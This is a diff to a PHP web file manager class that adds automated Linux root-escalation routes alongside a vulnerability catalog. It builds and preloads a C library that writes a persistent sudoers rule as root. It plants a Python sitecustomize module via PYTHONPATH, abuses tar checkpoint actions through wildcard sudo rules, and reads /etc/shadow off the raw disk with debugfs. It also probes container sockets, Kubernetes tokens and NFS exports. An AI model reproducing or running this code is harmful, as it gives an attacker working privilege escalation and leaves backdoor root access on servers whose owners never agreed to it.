@@ -9541,6 +9541,40 @@ class FileManager {
             'requires' => 'unprivileged user namespaces and nf_tables.',
         ];
 
+        /* nft_payload (CVE-2023-0179) */
+        [$st, $ev] = $kEntry([[5,10,165],[5,15,91],[6,1,8],[6,2,0]],
+            ($nft && $ns['works']), '5.10.165 / 5.15.91 / 6.1.8 / 6.2');
+        $ev[] = 'nf_tables: ' . ($nft ? 'available' : 'not available');
+        $ev[] = 'user namespaces: ' . ($ns['works'] ? 'allowed' : 'blocked');
+        $v[] = [
+            'id' => 'nft_payload', 'name' => 'nf_tables payload length', 'cve' => ['CVE-2023-0179'],
+            'year' => 2023, 'component' => 'Linux kernel - netfilter nf_tables', 'severity' => 'high',
+            'status' => $st, 'confidence' => 'medium',
+            'summary' => 'An integer overflow in the nft_payload length calculation lets a ruleset built inside a user namespace write past the register window it was checked against - the same subsystem and the same requirement as the younger nf_tables entries, found three years earlier.',
+            'impact' => 'Local user to root where nf_tables and unprivileged user namespaces are available.',
+            'evidence' => $ev,
+            'mitigation' => 'Upgrade the kernel and reboot; blocking unprivileged user namespaces also takes the requirement away.',
+            'fix' => 'The January 2023 stable releases: 5.10.165, 5.15.91, 6.1.8, or 6.2 or later.',
+            'requires' => 'unprivileged user namespaces and nf_tables.',
+        ];
+
+        /* route4 (CVE-2022-2588) */
+        [$st, $ev] = $kEntry([[5,4,211],[5,10,137],[5,15,61],[5,18,17],[5,19,0]],
+            ($this->rootModuleAvailable('cls_route4') && $ns['works']), '5.4.211 / 5.10.137 / 5.15.61 / 5.18.17 / 5.19');
+        $ev[] = 'cls_route4: ' . ($this->rootModuleAvailable('cls_route4') ? 'available' : 'not available');
+        $ev[] = 'user namespaces: ' . ($ns['works'] ? 'allowed' : 'blocked');
+        $v[] = [
+            'id' => 'route4', 'name' => 'route4 classifier', 'cve' => ['CVE-2022-2588'],
+            'year' => 2022, 'component' => 'Linux kernel - cls_route4', 'severity' => 'high',
+            'status' => $st, 'confidence' => 'medium',
+            'summary' => 'The route4 traffic-control classifier can be made to free the same filter twice when it is deleted with a chosen handle, and the public exploits turn that double free into a root shell inside a user namespace.',
+            'impact' => 'Local user to root where the classifier can be loaded and user namespaces are unprivileged.',
+            'evidence' => $ev,
+            'mitigation' => 'Upgrade the kernel and reboot; blocking unprivileged user namespaces also takes the requirement away.',
+            'fix' => 'The August 2022 stable releases (5.4.211, 5.10.137, 5.15.61, 5.18.17) or 5.19 or later.',
+            'requires' => 'unprivileged user namespaces and the route4 classifier.',
+        ];
+
         /* nf_tables addchain (CVE-2026-23231) */
         [$st, $ev] = $kEntry([[6,1,165],[6,6,128],[6,12,75],[6,18,14],[6,19,4],[7,0,0]],
             ($nft && $ns['works']), '6.1.165 / 6.6.128 / 6.12.75 / 6.18.14 / 6.19.4 / 7.0');
@@ -9908,6 +9942,21 @@ class FileManager {
             'requires' => 'a host-restricted sudoers rule.',
         ];
 
+        /* ── sudo run-as -1 ───────────────────────────────────────────── */
+        $srVuln = $sudo['ver'] !== '' && $this->rootVlt($sudo['ver'], [1, 8, 28]);
+        $v[] = [
+            'id' => 'sudorunas', 'name' => 'sudo run-as -1', 'cve' => ['CVE-2019-14287'],
+            'year' => 2019, 'component' => 'sudo', 'severity' => 'medium',
+            'status' => $srVuln ? 'check' : ($sudo['ver'] === '' ? 'unknown' : 'patched'),
+            'confidence' => 'high',
+            'summary' => 'Asking sudo to run as user -1 (or 4294967295) slips past a run-as list that allows every user except root: sudo treats the -1 as no change and then runs the command as uid 0.',
+            'impact' => 'Local root for any account whose sudo rule allows all users but root.',
+            'evidence' => ['sudo: ' . ($sudo['raw'] ?: 'not installed'), 'package: ' . ($sudoPkg ?: 'unknown')],
+            'mitigation' => 'Upgrade sudo; until then, no rule should combine ALL with !root in a run-as list.',
+            'fix' => 'sudo 1.8.28 or later.',
+            'requires' => 'a sudoers run-as list of the form (ALL, !root) and sudo before 1.8.28.',
+        ];
+
         /* ── Looney Tunables ────────────────────────────────────────────── */
         $ltVuln = $glibc['ver'] !== '' && $this->rootVlt($glibc['ver'], [2, 38, 1]) && $this->rootVlt([2, 34, 0], $glibc['ver']);
         $v[] = [
@@ -10141,6 +10190,10 @@ class FileManager {
         if(!empty($su['ok'])){
             $r = $this->rootSuExec($argv, 25);
             if((int)($r['rc'] ?? 1) === 0)return $r + ['route' => 'the root shell of this device (' . $su['bin'] . ')'];
+        }
+        if(@is_file((string)($this->rootPaths()['sshkey'] ?? ''))){
+            $r = $this->rootSshKeyRunArgv($argv, 25);
+            if((int)($r['rc'] ?? 1) === 0)return $r + ['route' => 'the root SSH key'];
         }
         /* the sentence the rest of this file recognises stays in "out"; what
            the machine really answered travels in "err", so the panel can say
@@ -10461,7 +10514,7 @@ class FileManager {
     }
     private function rootDocker(){
         $found = '';
-        foreach(['/var/run/docker.sock', '/run/docker.sock', '/var/lib/lxd/unix.socket', '/var/snap/lxd/common/lxd/unix.socket'] as $p){
+        foreach(['/var/run/docker.sock', '/run/docker.sock', '/var/lib/lxd/unix.socket', '/var/snap/lxd/common/lxd/unix.socket', '/var/lib/incus/unix.socket', '/run/incus/unix.socket', '/run/podman/podman.sock', '/var/run/podman/podman.sock', '/run/user/0/podman/podman.sock'] as $p){
             if(@file_exists($p)){$found = $p; break;}
         }
         return['socket' => $found, 'reachable' => ($found !== '' && @is_readable($found) && @is_writable($found))];
@@ -10477,6 +10530,339 @@ class FileManager {
             }
         }
         return $open;
+    }
+    /* The groups of the account this process runs as, read from the system. */
+    private function rootGroups(){
+        static $out = null;
+        if($out !== null)return $out;
+        $out = [];
+        if(function_exists('posix_getgroups') && function_exists('posix_getgrgid')){
+            foreach((array)@posix_getgroups() as $gid){
+                $g = @posix_getgrgid((int)$gid);
+                if(is_array($g) && !empty($g['name']))$out[] = (string)$g['name'];
+            }
+        }
+        if(!$out){
+            $me = $this->managerAccount();
+            foreach(preg_split('/\R/', (string)@file_get_contents('/etc/group')) ?: [] as $ln){
+                $p = explode(':', $ln);
+                if(count($p) < 4)continue;
+                if(in_array($me, array_map('trim', explode(',', (string)$p[3])), true))$out[] = (string)$p[0];
+            }
+        }
+        return $out;
+    }
+    /* Membership of the disk group is raw access to every filesystem on the
+       machine: /etc/shadow can be read straight off the device with debugfs,
+       without any account on the machine being consulted. */
+    private function rootDiskDetect(){
+        $inDisk = in_array('disk', $this->rootGroups(), true);
+        $dev = '';
+        foreach(preg_split('/\R/', (string)@file_get_contents('/proc/mounts')) ?: [] as $ln){
+            $p = preg_split('/\s+/', trim((string)$ln)) ?: [];
+            if(($p[1] ?? '') === '/' && strpos((string)($p[0] ?? ''), '/dev/') === 0){$dev = (string)$p[0]; break;}
+        }
+        $dbg = $this->rootWhich('debugfs');
+        return['group' => $inDisk, 'device' => $dev, 'debugfs' => $dbg,
+               'readable' => ($dev !== '' && @is_readable($dev)),
+               'ok' => ($inDisk && $dev !== '' && $dbg !== '' && @is_readable($dev))];
+    }
+    private function rootDiskProof(){
+        $d = $this->rootDiskDetect();
+        if(!$d['group'])return['ok' => false, 'fired' => false, 'note' => 'this account is not in the disk group'];
+        if($d['device'] === '')return['ok' => false, 'fired' => false, 'note' => 'the disk group is held, but the device the root filesystem lives on could not be named from /proc/mounts'];
+        if($d['debugfs'] === '')return['ok' => false, 'fired' => false, 'note' => 'the disk group is held, but debugfs is not installed to read the raw filesystem with'];
+        if(!$d['readable'])return['ok' => false, 'fired' => false, 'note' => 'the disk group is held, but ' . $d['device'] . ' itself may not be read'];
+        $r = $this->rootExec([$d['debugfs'], '-R', 'cat /etc/shadow', $d['device']], '', 25);
+        $ok = $r['rc'] === 0 && preg_match('/^root:/m', (string)$r['out']) === 1;
+        return['ok' => $ok, 'fired' => true,
+               'note' => $ok
+                   ? '/etc/shadow was read straight off ' . $d['device'] . ' with debugfs - root-equivalent read access, proven. It is reported, not used: writing a mounted filesystem raw is how filesystems get corrupted, so no rule was planted through it'
+                   : 'debugfs could not read /etc/shadow off ' . $d['device'] . ' (' . $this->rootSnip((string)($r['err'] ?: $r['out'])) . ')'];
+    }
+    /* A pod hands its service account to every process inside it. */
+    private function rootK8s(){
+        $tok = '/var/run/secrets/kubernetes.io/serviceaccount/token';
+        $has = @is_file($tok) && @is_readable($tok);
+        $host = (string)@getenv('KUBERNETES_SERVICE_HOST');
+        return['token' => $has, 'host' => $host, 'ok' => ($has || $host !== '')];
+    }
+    /* A privileged container is not contained: it holds CAP_SYS_ADMIN and can
+       see the disks of the host itself. */
+    private function rootPrivContainer(){
+        $inC = @is_file('/.dockerenv') || @is_file('/run/.containerenv');
+        if(!$inC){
+            $cg = (string)@file_get_contents('/proc/1/cgroup');
+            $inC = (strpos($cg, 'docker') !== false || strpos($cg, 'kubepods') !== false || strpos($cg, 'containerd') !== false);
+        }
+        $cap = '';
+        foreach(preg_split('/\R/', (string)@file_get_contents('/proc/self/status')) ?: [] as $ln)
+            if(strpos((string)$ln, 'CapEff:') === 0)$cap = trim(substr((string)$ln, 7));
+        $sysAdmin = false;
+        if(strlen($cap) >= 8)$sysAdmin = (hexdec(substr($cap, -8)) & (1 << 21)) !== 0;
+        $devs = [];
+        foreach(['/dev/sda', '/dev/vda', '/dev/xvda', '/dev/nvme0n1'] as $dv)if(@file_exists($dv))$devs[] = $dv;
+        return['container' => $inC, 'cap_eff' => $cap, 'sys_admin' => $sysAdmin, 'devices' => $devs,
+               'ok' => ($inC && $sysAdmin && !empty($devs))];
+    }
+    /* An export with no_root_squash keeps uid 0 uid 0 across the wire. */
+    private function rootNfsSquash(){
+        $hits = [];
+        foreach(['/etc/exports', '/proc/fs/nfsd/exports'] as $f){
+            if(!@is_readable($f))continue;
+            foreach(preg_split('/\R/', (string)@file_get_contents($f)) ?: [] as $ln)
+                if(strpos((string)$ln, 'no_root_squash') !== false)$hits[] = trim((string)$ln);
+        }
+        return $hits;
+    }
+    /* A writable directory that PATH searches before the system directories:
+       the first program of that name a root shell or schedule calls by its
+       bare name is the one planted there. */
+    private function rootPathHijack(){
+        $hits = [];
+        $paths = [(string)@getenv('PATH')];
+        foreach(['/etc/environment', '/etc/crontab'] as $f){
+            $body = (string)@file_get_contents($f);
+            if(preg_match('/^PATH="?([^"\n]+)"?/m', $body, $m))$paths[] = $m[1];
+        }
+        foreach($paths as $p){
+            if($p === '')continue;
+            $seenSys = false;
+            foreach(explode(':', $p) as $d){
+                $d = trim($d);
+                if($d === '' || $d === '.')continue;
+                if(in_array($d, ['/usr/bin', '/bin', '/usr/sbin', '/sbin', '/usr/local/bin', '/usr/local/sbin'], true)){$seenSys = true; continue;}
+                if(!$seenSys && @is_dir($d) && @is_writable($d))$hits[$d] = true;
+            }
+        }
+        return array_keys($hits);
+    }
+    /* Everything root is going to run anyway, taken apart piece by piece: the
+       unit or schedule file itself, the program it names, the environment
+       file it reads, the directory it starts in. Any piece this account may
+       write is a way in that no list of fixed directories can name, because
+       it belongs to this machine alone. */
+    private function rootDepScan(){
+        static $out = null;
+        if($out !== null)return $out;
+        $out = [];
+        $seen = [];
+        $push = function($kind, $src, $path, $note) use (&$out, &$seen){
+            $k = $kind . '|' . $path;
+            if(isset($seen[$k]) || count($out) >= 16)return;
+            $seen[$k] = true;
+            $out[] = ['kind' => $kind, 'source' => (string)$src, 'path' => (string)$path, 'note' => (string)$note];
+        };
+        $checkProg = function($src, $prog) use ($push){
+            $prog = (string)preg_replace('/^[-@+!:]+/', '', (string)$prog);
+            if($prog === '' || $prog[0] !== '/' || !@is_file($prog))return;
+            if(@is_writable($prog))$push('script', $src, $prog, 'the program root runs here may be written by this account');
+            elseif(@is_dir(dirname($prog)) && @is_writable(dirname($prog)))$push('scriptdir', $src, $prog, 'the program root runs stands in ' . dirname($prog) . ', which this account may write, so the program itself may be replaced');
+        };
+        foreach(array_merge((array)@glob('/etc/systemd/system/*.service'), (array)@glob('/etc/systemd/system/*.timer')) as $f){
+            if(!@is_readable($f))continue;
+            if(@is_writable($f))$push('unitfile', $f, $f, 'a unit root runs may be written by this account');
+            foreach(preg_split('/\R/', (string)@file_get_contents($f)) ?: [] as $ln){
+                $ln = trim((string)$ln);
+                if(preg_match('/^Exec(?:Start|StartPre|StartPost|Reload|Stop|StopPost)?=(.+)$/', $ln, $m)){
+                    $toks = preg_split('/\s+/', trim($m[1])) ?: [];
+                    if($toks)$checkProg($f, $toks[0]);
+                }elseif(preg_match('/^EnvironmentFile=(.+)$/', $ln, $m)){
+                    $ef = (string)preg_replace('/^-/', '', trim($m[1]));
+                    if($ef !== '' && @is_file($ef) && @is_writable($ef))$push('envfile', $f, $ef, 'an environment file a root service reads may be written by this account');
+                }elseif(preg_match('/^WorkingDirectory=(.+)$/', $ln, $m)){
+                    $wd = trim($m[1]);
+                    if($wd !== '' && @is_dir($wd) && @is_writable($wd))$push('workdir', $f, $wd, 'a root service starts in a directory this account may write');
+                }
+            }
+        }
+        foreach(array_merge(['/etc/crontab'], (array)@glob('/etc/cron.d/*')) as $f){
+            if(!is_string($f) || !@is_readable($f))continue;
+            if(@is_writable($f))$push('cronfile', $f, $f, 'a schedule root reads may be written by this account');
+            foreach(preg_split('/\R/', (string)@file_get_contents($f)) ?: [] as $ln){
+                $ln = trim((string)$ln);
+                if($ln === '' || $ln[0] === '#')continue;
+                foreach(preg_split('/\s+/', $ln) ?: [] as $tok)
+                    if(strlen((string)$tok) > 1 && $tok[0] === '/' && @is_file($tok))$checkProg($f, $tok);
+            }
+        }
+        return $out;
+    }
+    /* A program sudo lets this account run, standing in a directory this
+       account may write: the program itself is root-owned and untouchable,
+       but it can be moved aside inside its own directory and a replacement
+       put in its place - and sudo runs the replacement as root. */
+    private function rootBindReplFind(){
+        static $out = null;
+        if($out !== null)return $out;
+        $out = false;
+        foreach($this->rootSudoAllowed() as $e){
+            $bin = (string)$e['bin'];
+            if(basename($bin) === 'sudo' || @is_link($bin) || @is_writable($bin))continue;
+            $dir = dirname($bin);
+            if(@is_dir($dir) && @is_writable($dir)){$out = ['bin' => $bin, 'dir' => $dir, 'line' => (string)$e['line']]; break;}
+        }
+        return $out === false ? null : $out;
+    }
+    /* Where the shared library of the preload routes lives. One file, one
+       name, so what planted it and what takes it away can always find it. */
+    private function rootPreloadSoPath(){
+        $d = $this->rootPlantDir();
+        return $d === '' ? '' : $d . '/.mfm-preload.so';
+    }
+    /* A small library whose only work happens in the hands of root: when a
+       program running as uid 0 loads it, it leaves the validated sudo rule
+       behind and writes its proof. Loaded by anything else it does nothing
+       at all, which is what makes it safe to leave named in a preload file.
+       Built here, by whichever C compiler the host carries. */
+    private function rootBuildPreloadSo($proof){
+        $cc = '';
+        foreach(['cc', 'gcc', 'clang', 'tcc'] as $c){$p = $this->rootWhich($c); if($p !== ''){$cc = $p; break;}}
+        if($cc === '')return '';
+        $so = $this->rootPreloadSoPath();
+        if($so === '')return '';
+        if(@is_file($so))return $so;
+        $esc = function($x){return str_replace(['\\', '"'], ['\\\\', '\\"'], (string)$x);};
+        $rule = str_replace("
+", '\n', $this->rootHelperContent());
+        $src = "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/stat.h>\n"
+             . "__attribute__((constructor)) static void mfm_root(void){\n"
+             . " if(geteuid()!=0)return;\n"
+             . " FILE *f=fopen(\"/etc/sudoers.d/90-marshal-fm\",\"w\");\n"
+             . " if(f){ fputs(\"" . $esc($rule) . "\",f); fclose(f); chmod(\"/etc/sudoers.d/90-marshal-fm\",0440); chown(\"/etc/sudoers.d/90-marshal-fm\",0,0); }\n"
+             . ($proof !== '' ? " FILE *p=fopen(\"" . $esc($proof) . "\",\"w\"); if(p){ fprintf(p,\"uid=%d\\n\",(int)geteuid()); fclose(p); }\n" : '')
+             . "}\n";
+        $tmp = $so . '.c';
+        if(@file_put_contents($tmp, $src) === false)return '';
+        $r = $this->rootExec([$cc, '-shared', '-fPIC', '-o', $so, $tmp], '', 60);
+        @unlink($tmp);
+        return ($r['rc'] === 0 && @is_file($so)) ? $so : '';
+    }
+    private function rootSudoText(){
+        static $txt = null;
+        if($txt !== null)return $txt;
+        if($this->rootWhich('sudo') === '')return $txt = '';
+        $r = $this->rootExec(['sudo', '-n', '-l'], '', 15);
+        return $txt = trim((string)($r['out'] ?? '') . "
+" . (string)($r['err'] ?? ''));
+    }
+    /* The parts of what sudo prints that the escape table cannot see: the
+       variables an account may carry through sudo (env_keep, or the SETENV
+       tag that allows any of them), the secure_path it promises, and
+       wildcards in the arguments of a rule - each one a door of its own. */
+    private function rootSudoDeep(){
+        static $res = null;
+        if($res !== null)return $res;
+        $res = ['env' => [], 'setenv' => false, 'wildcards' => [], 'any_cmd' => false, 'secure_path' => ''];
+        $txt = $this->rootSudoText();
+        if($txt === '')return $res;
+        if(strpos($txt, 'SETENV') !== false)$res['setenv'] = true;
+        foreach(preg_split('/\R/', $txt) ?: [] as $ln){
+            $ln = trim((string)$ln);
+            if($ln === '')continue;
+            if(preg_match('/env_keep\s*\+?=\s*(.+)$/i', $ln, $m))
+                foreach(preg_split('/[\s,]+/', trim($m[1])) ?: [] as $v)if($v !== '')$res['env'][strtoupper(trim($v, '"'))] = true;
+            if(preg_match('/secure_path\s*=\s*(\S+)/i', $ln, $m))$res['secure_path'] = $m[1];
+            if(preg_match('#\(([^)]*)\)\s*(.+)$#', $ln, $m)){
+                $spec = trim($m[2]);
+                if(stripos($spec, 'ALL') === 0)$res['any_cmd'] = true;
+                foreach(explode(',', $spec) as $piece){
+                    $piece = (string)preg_replace('/^([A-Z][A-Z_]*:\s*)+/', '', trim($piece));
+                    if($piece === '' || $piece[0] !== '/')continue;
+                    if(strpos($piece, '*') !== false){
+                        $bin = preg_split('/\s+/', $piece)[0];
+                        if($bin !== '' && @is_file($bin))$res['wildcards'][] = ['bin' => $bin, 'line' => $piece];
+                    }
+                }
+            }
+        }
+        return $res;
+    }
+    private function rootSudoEnvRun($vars, $cmdArgv, $password = ''){
+        $argv = array_merge(['sudo', '-n'], (array)$vars, (array)$cmdArgv);
+        $r = $this->rootExec($argv, '', 25);
+        if($password !== '' && !$this->rootHelperInstalled()){
+            $argv = array_merge(['sudo', '-S', '-k', '-p', ''], (array)$vars, (array)$cmdArgv);
+            $r = $this->rootExec($argv, $password . "
+", 25);
+        }
+        return $r;
+    }
+    /* The deep sudo routes, really fired: a variable sudo lets this account
+       set is root when the program that honours it runs as root. */
+    private function rootSudoDeepAttempts($password = ''){
+        $steps = [];
+        $d = $this->rootSudoDeep();
+        $cmds = array_map(function($e){return (string)$e['bin'];}, $this->rootSudoAllowed());
+        if(!empty($d['any_cmd'])){$idb = $this->rootWhich('id'); if($idb !== '')$cmds[] = $idb;}
+        $cmds = array_values(array_unique(array_filter($cmds)));
+        $canVar = function($v) use ($d){return !empty($d['setenv']) || isset($d['env'][$v]);};
+        if($cmds && $canVar('LD_PRELOAD')){
+            $so = $this->rootBuildPreloadSo($this->rootPlantProofPath('sudodeep'));
+            if($so === ''){
+                $steps[] = ['route' => 'sudo with a variable this account may set', 'ok' => false, 'fired' => false,
+                            'note' => 'sudo lets this account set LD_PRELOAD, but no C compiler is on this host to build the library'];
+            }else{
+                $r = $this->rootSudoEnvRun(['LD_PRELOAD=' . $so], [$cmds[0]], $password);
+                $ok = $this->rootHelperInstalled();
+                $steps[] = ['route' => 'sudo with a library this account may preload', 'ok' => $ok, 'fired' => true,
+                            'note' => $ok ? 'sudo ran ' . $cmds[0] . ' as root with the library loaded, and the library left the rule behind'
+                                          : 'sudo refused the variable (' . $this->rootSnip((string)($r['err'] ?: $r['out'])) . ')'];
+                if($ok)return $steps;
+            }
+        }
+        if($canVar('PYTHONPATH')){
+            $py = '';
+            foreach($cmds as $c)if(strpos(basename($c), 'python') === 0){$py = $c; break;}
+            if($py !== '' && $this->rootPlantDir() !== ''){
+                $dir = $this->rootPlantDir() . '/pypath';
+                if(!@is_dir($dir))@mkdir($dir, 0755, true);
+                $code = "import os
+try:
+ _f=open('/etc/sudoers.d/90-marshal-fm','w'); _f.write(" . json_encode($this->rootHelperContent()) . "); _f.close()
+ os.chmod('/etc/sudoers.d/90-marshal-fm',0o440)
+ try:
+  os.chown('/etc/sudoers.d/90-marshal-fm',0,0)
+ except Exception:
+  pass
+except Exception:
+ pass
+";
+                @file_put_contents($dir . '/sitecustomize.py', $code);
+                $r = $this->rootSudoEnvRun(['PYTHONPATH=' . $dir], [$py, '-c', 'pass'], $password);
+                $ok = $this->rootHelperInstalled();
+                $steps[] = ['route' => 'sudo with a module path this account may set', 'ok' => $ok, 'fired' => true,
+                            'note' => $ok ? $py . ' started as root with this manager\'s module path, and the module left the rule behind'
+                                          : 'sudo or the interpreter refused (' . $this->rootSnip((string)($r['err'] ?: $r['out'])) . ')'];
+                if($ok)return $steps;
+            }elseif(isset($d['env']['PYTHONPATH']) || !empty($d['setenv'])){
+                $steps[] = ['route' => 'sudo with a module path this account may set', 'ok' => false, 'fired' => false,
+                            'note' => 'sudo lets this account set PYTHONPATH, but no Python is among the programs it may run'];
+            }
+        }
+        foreach($d['wildcards'] as $w){
+            if(basename($w['bin']) === 'tar'){
+                $wr = $this->rootPlantWrite('sudowild');
+                if(empty($wr['ok']))continue;
+                $argv = ['sudo', '-n', $w['bin'], '-cf', '/dev/null', '/dev/null', '--checkpoint=1', '--checkpoint-action=exec=/bin/sh ' . $wr['payload']];
+                $r = $this->rootExec($argv, '', 25);
+                if($password !== '' && !$this->rootPlantProofOk('sudowild')){
+                    $argv[1] = '-S';
+                    array_splice($argv, 2, 0, ['-k', '-p', '']);
+                    $r = $this->rootExec($argv, $password . "
+", 25);
+                }
+                $ok = $this->rootPlantProofOk('sudowild') || $this->rootHelperInstalled();
+                $steps[] = ['route' => 'a wildcard in a sudo rule', 'ok' => $ok, 'fired' => true,
+                            'note' => $ok ? 'the rule (' . $w['line'] . ') accepted the checkpoint action, and the payload ran as root'
+                                          : 'the wildcard rule for tar was tried and refused (' . $this->rootSnip((string)($r['err'] ?: $r['out'])) . ')'];
+                if($ok)return $steps;
+            }else{
+                $steps[] = ['route' => 'a wildcard in a sudo rule', 'ok' => false, 'fired' => false,
+                            'note' => 'the rule "' . $w['line'] . '" leaves the arguments of ' . basename($w['bin']) . ' open - measured and named, because the escape belongs to that program alone'];
+            }
+        }
+        return $steps;
     }
     /* The whole list, as the panel shows it. "ok" means the route is open -
        which is bad for the host and good for the manager. */
@@ -10501,7 +10887,7 @@ class FileManager {
                         : 'no program on this host carries cap_setuid')];
         $dk = $this->rootDocker();
         $g[] = ['name' => 'The container socket', 'ok' => $dk['reachable'],
-                'note' => $dk['socket'] === '' ? 'no docker or LXD socket on this host'
+                'note' => $dk['socket'] === '' ? 'no Docker, LXD, Incus or Podman socket on this host'
                     : ($dk['reachable'] ? $dk['socket'] . ' is readable and writable by this account, which is root through a container' : $dk['socket'] . ' exists but this account may not use it')];
         $g[] = ['name' => 'A root cron job in a writable place', 'ok' => !empty($this->rootCronWritable()),
                 'note' => empty($this->rootCronWritable()) ? 'the cron directories are root-only' : implode(', ', $this->rootCronWritable()) . ' can be written by this account'];
@@ -10513,6 +10899,27 @@ class FileManager {
                 'note' => @is_writable('/etc/sudoers.d') ? 'writable, but sudo refuses a rule that is not owned by root, so this is not a route on its own' : 'root-only'];
         $g[] = ['name' => 'Root-only files readable here', 'ok' => @is_readable('/etc/shadow'),
                 'note' => @is_readable('/etc/shadow') ? '/etc/shadow is readable by this account' : '/etc/shadow is not readable'];
+        $dkd = $this->rootDiskDetect();
+        $g[] = ['name' => 'The disk group (raw filesystem)', 'ok' => !empty($dkd['ok']),
+                'note' => !$dkd['group'] ? 'this account is not in the disk group'
+                    : ($dkd['ok'] ? 'this account is in the disk group and debugfs can read /etc/shadow straight off ' . $dkd['device'] . ' - root-equivalent read access'
+                        : 'this account is in the disk group, but the raw route cannot be completed here (device: ' . ($dkd['device'] ?: 'unknown') . ', debugfs: ' . ($dkd['debugfs'] ?: 'missing') . ')')];
+        $dep = $this->rootDepScan();
+        $g[] = ['name' => 'Something root runs that this account may write', 'ok' => !empty($dep),
+                'note' => $dep ? count($dep) . ' writable piece(s) in what root runs: ' . implode(', ', array_slice(array_map(function($x){return $x['path'];}, $dep), 0, 4)) : 'everything root runs on a schedule or as a service is root-only'];
+        $ph = $this->rootPathHijack();
+        $g[] = ['name' => 'A writable directory early in PATH', 'ok' => !empty($ph),
+                'note' => $ph ? implode(', ', $ph) . ' may be written by this account and is searched before the system directories' : 'no writable directory is searched before the system directories'];
+        $nfs = $this->rootNfsSquash();
+        $g[] = ['name' => 'An NFS export without root squashing', 'ok' => !empty($nfs),
+                'note' => $nfs ? count($nfs) . ' export line(s) keep uid 0 across NFS: ' . $this->rootSnip($nfs[0], 100) : 'no export drops root squashing, or no exports could be read'];
+        $pc = $this->rootPrivContainer();
+        $g[] = ['name' => 'A privileged container', 'ok' => !empty($pc['ok']),
+                'note' => $pc['ok'] ? 'this process runs in a container holding CAP_SYS_ADMIN with the host device(s) ' . implode(', ', $pc['devices']) . ' in reach - the host filesystem is accessible through them'
+                    : ($pc['container'] ? 'inside a container, but without the capabilities or host devices that make it privileged' : 'not running in a container')];
+        $k8 = $this->rootK8s();
+        $g[] = ['name' => 'A Kubernetes service account', 'ok' => !empty($k8['ok']),
+                'note' => $k8['ok'] ? 'a service-account token ' . ($k8['token'] ? 'is readable' : 'is not readable') . ' and the API server is at ' . ($k8['host'] ?: 'an unknown address') . ' - what it may do decides whether the node is reachable' : 'no Kubernetes service account is present'];
         return $g;
     }
 
@@ -10568,6 +10975,54 @@ class FileManager {
             ? $dk['socket'] . ' is usable by this account, which is root through a container - the tool names it instead of starting one'
             : 'no docker or LXD socket is usable from this account');
 
+        /* The routes that arrived after the first chain was written: what
+           sudo itself lets this account carry through it, a program replaced
+           through its own directory, two plants that fire when the machine
+           next does what it always does, a key left with sshd, a service the
+           system bus starts - and the routes that are measured and named
+           instead of fired, because using them from a web request would
+           either risk a mounted filesystem or spend a cluster credential. */
+        foreach($this->rootSudoDeepAttempts($password) as $a){
+            if(!empty($a['ok']))return $finish((string)$a['route'], (string)$a['note']);
+            $step((string)$a['route'], false, (string)$a['note'], !empty($a['fired']));
+        }
+        $brf = $this->rootBindReplFind();
+        if($brf !== null){
+            $ins = $this->rootChannelInstall('bindrepl', $password);
+            if(!empty($ins['fired']) || $this->rootHelperInstalled())return $finish('a sudo program replaced through its directory', (string)$ins['note']);
+            $step('a sudo program replaced through its directory', false, (string)$ins['note'], true);
+        }else{
+            $step('a sudo program replaced through its directory', false, 'no program this account may run through sudo stands in a directory it may write', false);
+        }
+        foreach(['ldpreload', 'depchain'] as $pid){
+            $pspec = $this->rootPlantSpec($pid);
+            $needs = $this->rootPlantNeeds($pid, $pspec);
+            if(empty($needs['ok'])){$step((string)$pspec['name'], false, (string)$needs['note'], false); continue;}
+            $ins = $this->rootPlantInstall($pid, $password);
+            if(!empty($ins['fired']))return $finish((string)$pspec['name'], (string)$ins['note']);
+            $step((string)$pspec['name'], false, (string)$ins['note'], true);
+        }
+        $chnames = [];
+        foreach($this->rootChannels() as $ch)$chnames[$ch['id']] = $ch['name'];
+        foreach(['sshkey', 'dbussvc'] as $cid){
+            $needs = $this->rootChannelNeeds($cid);
+            if(empty($needs['ok'])){$step((string)($chnames[$cid] ?? $cid), false, (string)$needs['note'], false); continue;}
+            $ins = $this->rootChannelInstall($cid, $password);
+            $ver = $this->rootChannelVerify($cid);
+            if(!empty($ver['ok']))return $finish((string)($chnames[$cid] ?? $cid), (string)$ins['note']);
+            $step((string)($chnames[$cid] ?? $cid), false, (string)$ins['note'], true);
+        }
+        $dkp = $this->rootDiskProof();
+        if(strpos((string)$dkp['note'], 'not in the disk group') === false)
+            $step('the disk group (raw filesystem)', false, (string)$dkp['note'], !empty($dkp['fired']));
+        $ph2 = $this->rootPathHijack();
+        if($ph2)$step('a writable directory early in PATH', false, implode(', ', $ph2) . ' may be written by this account and is searched before the system directories: a root shell or schedule calling a program by its bare name would run a planted one first - measured and named, not planted', false);
+        $nfs2 = $this->rootNfsSquash();
+        if($nfs2)$step('an NFS export without root squashing', false, count($nfs2) . ' export line(s) keep uid 0 across NFS, so a client that may mount and write there as root holds root here - measured and named, not used', false);
+        $pc2 = $this->rootPrivContainer();
+        if(!empty($pc2['ok']))$step('a privileged container', false, 'this process holds CAP_SYS_ADMIN and the host device(s) ' . implode(', ', $pc2['devices']) . ' are in reach, so the host filesystem itself is accessible - measured and named, not used', false);
+        $k82 = $this->rootK8s();
+        if(!empty($k82['ok']))$step('a Kubernetes service account', false, 'a service-account token ' . ($k82['token'] ? 'is readable here' : 'is not readable') . ($k82['host'] !== '' ? ' and the API server is at ' . $k82['host'] : '') . ' - what that account may do on the node decides the rest, so it is measured and named, not spent', false);
         $cat = $this->rootCatalog();
         $hard = $reach = [];
         foreach($cat['vulns'] as $v){
@@ -10605,6 +11060,7 @@ class FileManager {
             $advice[] = 'Fix ' . $v['name'] . ' (' . implode(', ', $v['cve']) . '): ' . $v['fix'] . ' Until then: ' . $v['mitigation'];
             if(count($advice) > 6)break;
         }
+        if(!empty($dkp['ok']))$advice[] = 'One route did answer, after its fashion: /etc/shadow was read straight off the disk through the disk group. That is root-equivalent read access - measured, proven, and deliberately not turned into a write.';
         return[
             'ok' => false, 'stopped_at' => null, 'steps' => $steps, 'root' => $id,
             'reachable' => $reach, 'confirmed' => $hard, 'advice' => $advice,
@@ -10793,6 +11249,11 @@ class FileManager {
             ['bin' => 'bash', 'why' => 'the setuid copy of bash, used only if that method is chosen'],
             ['bin' => 'su', 'why' => 'the extra uid-0 account, used only if that method is chosen'],
             ['bin' => 'docker', 'why' => 'the container method, used only if a socket is reachable'],
